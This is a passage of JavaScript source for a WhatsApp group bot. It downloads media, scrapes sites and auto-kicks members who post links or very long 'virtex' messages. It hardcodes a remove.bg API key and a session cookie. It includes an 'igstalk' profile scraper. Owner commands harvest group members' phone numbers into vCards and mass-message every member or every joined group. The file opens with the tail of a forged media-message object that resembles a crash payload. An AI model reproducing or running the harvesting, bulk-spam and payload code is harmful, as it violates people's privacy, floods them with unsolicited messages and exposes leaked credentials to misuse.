"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Kyuu.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Kyuu.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
Kyuu.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return Kyuu.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`This feature is specifically for premium user, contact the owner to become premium user`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await Kyuu.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await Kyuu.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await Kyuu.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return Kyuu.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
        if (isAdmins) return Kyuu.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
        if (XeonTheCreator) return Kyuu.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
        kice = m.sender
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Kyuu.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame  by Fxyz
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
kice = m.sender
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
kice = m.sender
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex  by Fxyz
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return m.reply(mess.botAdmin)
          await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			Kyuu.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words  by Fxyz
if (antiToxic)
if (BadXeon.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin/owner that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}
//antilink youtube video by FallZx
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by FallZx
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}
//antilink instagram by FallZx
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by FallZx
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by FallZx
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by FallZx
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by FallZx
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by FallZx
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
        await Kyuu.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kyuu.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
Kyuu.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
Kyuu.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
Kyuu.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}

if (!isCmd && isAlreadyKyuuList(chath, dblist)) {
var getraindata = getDataKyuuList(chath, dblist)
if (getraindata.isImage === false) {
Kyuu.sendMessage(m.chat, { text: sendKyuuList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getraindata.image_url)
Kyuu.sendImage(m.chat, buff, `${getraindata.response}`, m)
}
}

if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: Kyuu.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Kyuu.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Kyuu.ev.emit('messages.upsert', msg)
}
//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
Kyuu.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

switch (command) {
	case 'public': {
                if (!XeonTheCreator) return replygcxeon(mess.owner)
                Kyuu.public = true
                replygcxeon('*Successful in Changing To Public Usage*')
            }
            break
            case 'self': {
                if (!XeonTheCreator) return replygcxeon(mess.owner)
                Kyuu.public = false
                replygcxeon('*Successful in Changing To Self Usage*')
            }
            break
            case 'qc': case'text': {
    if (!args[0] && !m.quoted) {
      return replygcxeon(`Where is the text?`)
    }
    let userPfp
    if (m.quoted) {
      try {
        userPfp = await Kyuu.profilePictureUrl(m.quoted.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    } else {
      try {
        userPfp = await Kyuu.profilePictureUrl(m.sender, "image")
      } catch (e) {
        userPfp = defaultpp
      }
    }
    const waUserName = pushname
    const quoteText = m.quoted ? m.quoted.body : args.join(" ")
    const quoteJson = {
      type: "quote",
      format: "png",
      backgroundColor: "#FFFFFF",
      width: 700,
      height: 580,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: waUserName,
            photo: {
              url: userPfp,
            },
          },
          text: quoteText,
          replyMessage: {},
        },
      ],
    }
    try {
      const quoteResponse = await axios.post("https://bot.lyo.su/quote/generate", quoteJson, {
        headers: { "Content-Type": "application/json" },
      })
      const buffer = Buffer.from(quoteResponse.data.result.image, "base64")
      Kyuu.sendImageAsSticker(m.chat, buffer, m, {
        packname: packname,
        author: author,
      })
    } catch (error) {
      console.error(error)
      replygcxeon('Error')
    }
    }
    break
case 'idgc': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await Kyuu.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 Kyuu.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'owner': {
const repf = await Kyuu.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
Kyuu.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
        
        case 'remini': {
            if (isMedia) {
                    const media = await Kyuu.downloadAndSaveMediaMessage(quoted)
                    const anu = await TelegraPh(media)
                    await 
                    Kyuu.sendMessage(m.chat, { image: { url: `https://api.itsrose.site/image/unblur?url=${anu}&apikey=kyuu` }, caption: `Sukses membuat hd` }, { quoted: m })
                } else {
                reply('Reply gambar nya bang')
                }
            }
            break
case "pushcontactv2":
if (!XeonTheCreator) return khususOwner()
if (msg.isGroup) return reply(`Fitur Ini Hanya Bisa Digunakan Di Private Chat`)
if (!q) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const hay = q.split("|")[1]
const groupMetadataa = !m.isGroup? await Kyuu.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
Kyuu.sendMessage(mem, { text: hay })
await sleep(200)
}
reply("*SUCCESFUL ✅*")
break
case 'hidetag': 
case 'h':{
if (!XeonTheCreator) return m.reply('Khusus Balz Adit Mipz')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
xd.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
case 'promote': {
if (!XeonTheCreator) return m.reply('Khusus creator bot')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(from, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'demote': {
if (!XeonTheCreator) return m.reply('Khusus creator bot')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(from, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'public': {
if (!XeonTheCreator) return m.reply('Khusus creator bot')
xd.public = true
m.reply('Sukse Change To Public')
}
break
case 'self': {
if (!XeonTheCreator) return m.reply('Khusus creator bot')
xd.public = false
m.reply('Sukses Change To Self')
}
break
case 'kick': {
if (!XeonTheCreator) return m.reply('Khusus creator bot')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(from, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case "jpm": case "post": {
if (!XeonTheCreator) return khususOwner()
if (!text) return replygcxeon(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
let getGroups = await Kyuu.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Kyuu.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Kyuu.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Kyuu.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Kyuu.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL ✅*")
}
break
case "savecontact": {
if (!XeonTheCreator) return khususOwner()
if (!m.isGroup)  return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)
await replygcxeon("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadata = m.isGroup? await Kyuu.groupMetadata(from).catch(e => {}) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
replygcxeon("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
